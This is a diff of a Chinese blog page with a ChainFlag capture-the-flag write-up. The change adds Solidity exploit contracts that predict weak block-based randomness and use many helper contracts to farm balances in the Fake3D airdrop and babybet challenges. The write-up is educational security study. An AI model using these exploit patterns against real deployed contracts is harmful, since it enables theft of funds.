@@ -1794,7 +1794,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1694063332537),
+    lastupdate: new Date(1696680122707),
     sidebar: {
       for_page: ["blogger","category","tagcloud","webinfo","qrcode"],
       for_post: ["toc","blogger","qrcode"],
@@ -2443,6 +2443,23 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
           
                     
+                      
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/categories/Foundry/" title="Foundry"
+                  
+                  
+                  
+                    active-action="action-categoriesFoundry"
+                  >
+                  <i class='fa-solid fa-book fa-fw'></i>Foundry
+                </a>
+                
+              </li>
+            
+          
+                    
                   </ul>
                 
               </li>
@@ -2750,6 +2767,23 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
           
                     
+                      
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/categories/Foundry/" title="Foundry"
+                  
+                  
+                  
+                    active-action="action-categoriesFoundry"
+                  >
+                  <i class='fa-solid fa-book fa-fw'></i>Foundry
+                </a>
+                
+              </li>
+            
+          
+                    
                   </ul>
                 
               </li>
@@ -2995,13 +3029,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class="new-meta-item wordcount">
     <a class='notlink'>
       <i class="fa-solid fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>字数：2k 字</p>
+      <p>字数：2.1k 字</p>
     </a>
   </div>
   <div class="new-meta-item readtime">
     <a class='notlink'>
       <i class="fa-solid fa-bell fa-fw" aria-hidden="true"></i>
-      <p>时长：10 分钟</p>
+      <p>时长：11 分钟</p>
     </a>
   </div>
 
@@ -3092,6 +3126,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <p><strong>如图：</strong></p>
 <p><img src="/2023/08/21/Smart%20contracts/ChainFlag/airdrop_hunting/airdrop_hunting(3)/image-20230822154729008.png" alt="image-20230822154729008"></p>
+<p><em>其实当初的做法还是有点繁琐了，也不知道是不是科技进步了其实是可以一次性完成的，只要成功部署如下合约即可</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">contract Fake3DHacker &#123;</span><br><span class="line"></span><br><span class="line">    using SafeMath for *;</span><br><span class="line">    Fake3D fake;</span><br><span class="line"></span><br><span class="line">    constructor(address _fake) public &#123;</span><br><span class="line"></span><br><span class="line">        fake = Fake3D(_fake);</span><br><span class="line"></span><br><span class="line">		uint256 seed = uint256(keccak256(abi.encodePacked(</span><br><span class="line">            (block.timestamp).add</span><br><span class="line">            (block.difficulty).add</span><br><span class="line">            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add</span><br><span class="line">            (block.gaslimit).add</span><br><span class="line">            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add</span><br><span class="line">            (block.number)</span><br><span class="line">        )));</span><br><span class="line"></span><br><span class="line">        require((seed - ((seed / 1000) * 1000)) &lt; 288, &quot;the result of the calculation is not less than 288&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        for(uint i; i &lt; 889; i++) &#123;</span><br><span class="line">            fake.airDrop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <h2 id="babybet"><a href="#babybet" class="headerlink" title="babybet"></a>babybet</h2><h3 id="1-question-2"><a href="#1-question-2" class="headerlink" title="1. question"></a>1. question</h3><p><strong>源码：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">contract babybet &#123;</span><br><span class="line">    mapping(address =&gt; uint) public balance;</span><br><span class="line">    mapping(address =&gt; uint) public status;</span><br><span class="line">    address owner;</span><br><span class="line">    </span><br><span class="line">    //Don&#x27;t leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough.</span><br><span class="line">    //Gmail is ok. 163 and qq may have some problems.</span><br><span class="line">    event sendflag(string md5ofteamtoken,string b64email); </span><br><span class="line">    </span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        balance[msg.sender]=1000000;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //pay for flag</span><br><span class="line">    function payforflag(string md5ofteamtoken,string b64email) public&#123;</span><br><span class="line">        require(balance[msg.sender] &gt;= 1000000);</span><br><span class="line">        if (msg.sender!=owner)&#123;</span><br><span class="line">        balance[msg.sender]=0;&#125;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">        emit sendflag(md5ofteamtoken,b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner()&#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //get_profit</span><br><span class="line">    function profit()&#123;</span><br><span class="line">        require(status[msg.sender]==0);</span><br><span class="line">        balance[msg.sender]+=10;</span><br><span class="line">        status[msg.sender]=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //add money</span><br><span class="line">    function () payable&#123;</span><br><span class="line">        balance[msg.sender]+=msg.value/1000000000000000000;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //bet</span><br><span class="line">    function bet(uint num) &#123;</span><br><span class="line">        require(balance[msg.sender]&gt;=10);</span><br><span class="line">        require(status[msg.sender]&lt;2);</span><br><span class="line">        balance[msg.sender]-=10;</span><br><span class="line">        uint256 seed = uint256(blockhash(block.number-1));</span><br><span class="line">        uint rand = seed % 3;</span><br><span class="line">        if (rand == num) &#123;</span><br><span class="line">            balance[msg.sender]+=1000;</span><br><span class="line">        &#125;</span><br><span class="line">        status[msg.sender]=2;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //transfer</span><br><span class="line">    function transferbalance(address to,uint amount)&#123;</span><br><span class="line">        require(balance[msg.sender]&gt;=amount);</span><br><span class="line">        balance[msg.sender]-=amount;</span><br><span class="line">        balance[to]+=amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -3102,8 +3139,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>思路大差不差，通过两个合约代码，生成多个<code>Helper</code>帮助<code>Hacker</code>积攒<code>balance</code>。</p>
 <p>又因为<code>rand</code>是可控的，所以可以提前计算随机数，再根据随机数进行赌博，，，所以啊不要赌博，十赌九输。</p>
 </blockquote>
-<h3 id="3-solve-2"><a href="#3-solve-2" class="headerlink" title="3. solve"></a>3. solve</h3><p><em>攻击方式，部署<code>Hacker</code>，连续调用10次<code>attack1()</code>，再调用<code>attack2()</code>。</em></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">contract Helper &#123;</span><br><span class="line"></span><br><span class="line">    babybet bet;</span><br><span class="line"></span><br><span class="line">    constructor(address _bet, uint rand) public &#123;</span><br><span class="line">        bet = babybet(_bet);</span><br><span class="line">        bet.profit();</span><br><span class="line">        bet.bet(rand);</span><br><span class="line">        bet.transferbalance(msg.sender, 1000);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hacker &#123;</span><br><span class="line"></span><br><span class="line">    babybet bet;</span><br><span class="line"></span><br><span class="line">    constructor(address _bet) public &#123;</span><br><span class="line">        bet = babybet(_bet);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack1() public &#123;</span><br><span class="line">        uint256 seed = uint256(blockhash(block.number-1));</span><br><span class="line">        uint rand = seed % 3;</span><br><span class="line">        for (uint i; i &lt; 100; i++) &#123;</span><br><span class="line">            new Helper(address(bet), rand);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack2() public &#123;</span><br><span class="line">        bet.payforflag(&quot;HC&quot;, &quot;hacker&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="3-solve-2"><a href="#3-solve-2" class="headerlink" title="3. solve"></a>3. solve</h3><p><em>攻击方式，部署<code>Hacker</code>，成功调用2次<code>attack()</code>，再调用<code>pwn()</code>。</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">contract BabyBetHacker &#123;</span><br><span class="line"></span><br><span class="line">    babybet bet;</span><br><span class="line"></span><br><span class="line">    constructor(address _bet) public &#123;</span><br><span class="line">        bet = babybet(_bet);</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line"></span><br><span class="line">        uint256 seed = uint256(blockhash(block.number-1));</span><br><span class="line">        uint rand = seed % 3;      </span><br><span class="line"></span><br><span class="line">        for (uint i; i &lt; 500; i++) &#123;</span><br><span class="line">            new BabyBetHelper(address(bet), rand);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn() public &#123;</span><br><span class="line">        bet.payforflag(&quot;BYYQ1030Hacker&quot;, &quot;BYYQ&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract BabyBetHelper &#123;</span><br><span class="line"></span><br><span class="line">    babybet bet;</span><br><span class="line"></span><br><span class="line">    constructor(address _bet, uint answer) public &#123;</span><br><span class="line">        bet = babybet(_bet);</span><br><span class="line">        bet.profit();</span><br><span class="line">        bet.bet(answer);</span><br><span class="line">        bet.transferbalance(msg.sender, 1000);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2023/08/21/Smart%20contracts/ChainFlag/airdrop_hunting/airdrop_hunting(3)/image-20230822161340458.png" alt="image-20230822161340458"></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><em><strong>区块链上的一些信息是具有共性的，比如在同一个函数中调用了较多函数，且这是被调用函数中都涉及到了一些区块信息，比如<code>block.number，now</code>等，但是只有在一个区块中这些值都是相等的，意味着某些随机数并不随机。。。</strong></em></p>
